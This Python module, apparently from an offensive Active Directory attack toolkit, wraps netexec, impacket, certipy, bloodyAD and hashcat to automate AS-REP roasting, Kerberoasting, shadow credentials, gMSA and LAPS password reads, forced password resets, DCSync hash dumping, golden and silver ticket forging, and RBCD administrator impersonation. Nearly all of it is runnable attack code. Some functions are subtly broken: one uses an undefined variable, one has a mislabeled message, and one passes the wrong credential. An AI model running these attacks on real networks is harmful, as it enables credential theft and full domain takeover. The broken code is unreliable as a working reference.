import os 
import config
import re
from mods import dacl

def asreproast(box, path):
    """
    list optional (Missing)
    """
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m ASREProast')
    if box.krb:
        print(f'\033[91m[!]\033[0m Kerberos Auth not supportet!')
        exit()
    elif box.nt_hash:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --asreproast ASREProastables.txt"
    else:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast ASREProastables.txt"
    cmd2 = 'hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m ASREProast\n')

def krbroast(box, path):
    config.required_creds(box)
    """
    """
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Kerberoast')
    if box.krb:
        cmd1 = f"{box.krb} netexec ldap {box.fqdn} -u {box.username} --use-kcache --kerberoasting kerberoastables.txt"
    elif box.nt_hash:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --kerberoasting kerberoastables.txt"
    else:
        cmd1 = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting kerberoastables.txt"
    cmd2 = 'hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m Kerberoast\n')

def target_krbroast(box, path):
    config.required_creds(box)
    """
    target optional
    """
    opt = ''
    target = ''
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Targeted Kerberoasting (time sync)')
    if box.target and box.target != box.username:
        opt = f' --request-user {box.target}'
        target = '-'+box.target
    if box.krb:
        cmd1 = f"{box.krb} targetedKerberoast.py -d {box.domain} -u {box.username} -k --no-pass -o targeted_kerberoasting{target}.txt"+opt
    elif box.nt_hash:
        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -H {box.nt_hash} -o targeted_kerberoasting{target}.txt"+opt
    else:
        cmd1 = f"targetedKerberoast.py -d {box.domain} -u {box.username} -p {box.password} -o targeted_kerberoasting{target}.txt"+opt
    cmd2 = f'hashcat -m 13100 targeted_kerberoasting{target}.txt /usr/share/wordlists/rockyou.txt'
    config.log_cmd([cmd1,cmd2])
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    if os.path.exists(f'{path.ws_atk}/targeted_kerberoasting{target}.txt'):
        os.remove(f'{path.ws_atk}/targeted_kerberoasting{target}.txt')
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m Targeted Kerberoasting\n')

def shadow_creds(box, path):
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Shadow Credentials (time sync)')
    if box.krb:
        cmd = f"{box.krb} certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -k -no-pass -account {box.target} auto"
    elif box.nt_hash:
        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -hashes {box.nt_hash} -account {box.target} auto"
    else:
        cmd = f"certipy-ad shadow -target {box.fqdn} -u {box.username}@{box.domain} -p {box.password} -account {box.target} auto"
    config.log_cmd(cmd)
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {box.target}-shadow_creds.out')
    print('\033[92m[+]\033[0m Shadow Credentials\n')

def ReadGMSAPassword(box, path):
    config.required_creds(box)
    print('\033[93m[*]\033[0m ReadGMSAPassword')
    if box.krb:
        cmd = f"{box.krb} netexec ldap {box.fqdn} -u {box.username} --use-kcache --gmsa"
    elif box.nt_hash:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} --gmsa"
    else:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --gmsa"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    cmd_out = os.popen(cmd).read()
    print(cmd_out)
    match = re.search(r'Account:\s+(\S+)', cmd_out)
    if match:
        gmsa_name = match.group(1)
        with open(f'{path.ws_atk}/gmsa-{gmsa_name}.out', "w", encoding="utf-8") as f:
            f.write(cmd_out)
    print('\033[92m[+]\033[0m Read GMSA password\n')

def ReadLAPSPassword(box, path):
    config.required_creds(box)
    os.chdir(path.ws_atk)
    target = ''
    opt = ''
    print('\033[93m[*]\033[0m Read LAPS password')
    if box.target:
        opt = f" -computer {box.target}"
        target = box.target+'-'
    if box.krb:
        cmd = f"{box.krb} impacket-GetLAPSPassword {box.domain}/{box.username} -k -no-pass"+opt
    elif box.nt_hash:
        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
    else:
        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:{box.password}"+opt
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {target}laps_password.out')
    print('\033[92m[+]\033[0m Read LAPS password\n')

def ForceChangePassword(box):
    config.required_creds(box)
    config.required_target(box)
    new_password = 'newPassword1!'
    print('\033[93m[*]\033[0m ForceChangePassword')
    if box.krb:
        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -u {box.username} -p -k set password {box.target} {new_password}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p :{box.nt_hash} set password {box.target} {new_password}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p {box.password} set password {box.target} {new_password}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print(f"\033[95m[#]\033[0m Target Creds: {box.target} : {new_password}\t-u {box.target} -p '{new_password}'")
    print('\033[92m[+]\033[0m ForceChangePassword\n')

def dcsync(box, path):
    config.required_creds(box)
    opt = ''
    outfile = 'secretsdump.out'
    os.makedirs(path.ws_atk+'secretsdump', exist_ok=True)
    os.chdir(path.ws_atk+'secretsdump')
    print('\033[93m[*]\033[0m DCSync')
    if box.target:
        opt = f' -just-dc-user {box.target}'
        outfile = f'{box.target}-secretsdump.out'
    if box.krb:
        cmd = f"{box.krb} impacket-secretsdump {box.fqdn} -k -no-pass -outputfile {outfile}"+opt
    elif box.nt_hash:
        cmd = f"impacket-secretsdump {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash} -outputfile {outfile}"+opt
    else:
        cmd = f"impacket-secretsdump {box.domain}/{box.username}:{box.password}@{box.fqdn} -outputfile {outfile}"+opt
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m DCSync\n')

def golden_ticket(box, path):
    config.required_creds(box)
    os.chdir(path.ws_ccache)
    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a, --action sid')
        exit()
    else:
        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
    print('\033[93m[*]\033[0m Golden ticket')
    if box.nt_hash:
        if len(box.nt_hash) == 32:
            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
        else:
            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
    else:
        print(f'\033[91m[!]\033[0m Need NT hash or AES key for golden ticket!')
        exit()
    print(f'\033[96m[$]\033[0m {cmd}')
    config.log_cmd(cmd)
    os.system(cmd)
    print('\033[92m[+]\033[0m Golden ticket\n')

def silver_ticket(box, path):
    config.required_creds(box)
    os.chdir(path.ws_ccache)
    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a, --action sid')
        exit()
    else:
        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
    print('\033[93m[*]\033[0m Golden ticket')
    if box.nt_hash:
        if len(box.nt_hash) == 32:
            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
        else:
            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
    else:
        print(f'\033[91m[!]\033[0m Need NT hash or AES key for silver ticket!')
        exit()
    print(f'\033[96m[$]\033[0m {cmd}')
    config.log_cmd(cmd)
    os.system(cmd)
    print('\033[92m[+]\033[0m Silver ticket\n')

def rbcd(box,path):
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_ccache)
    computer_name = 'RBCDPC'
    computer_password = dacl.addcomputer(box,computer_name)
    print('\033[93m[*]\033[0m Resource Based Constrained Delegation')
    if box.krb:
        cmd1 = f"{box.krb} impacket-rbcd {box.domain}/ -dc-host {box.fqdn} -delegate-from {computer_name} -delegate-to {box.target} -action write"
    elif box.nt_hash:
        cmd1 = f"impacket-rbcd {box.domain}/{box.username} -hashes :{box.nt_hash} -delegate-from {computer_name} -delegate-to {box.target} -action write"
    else:
        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:{box.password} -delegate-from {computer_name} -delegate-to {box.target} -action write"
    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
    cmd2 = f"impacket-getST {box.domain}/{computer_name}:{computer_password}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1)
    print(f'\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2)
    print('\033[92m[+]\033[0m Resource Based Constrained Delegation\n')
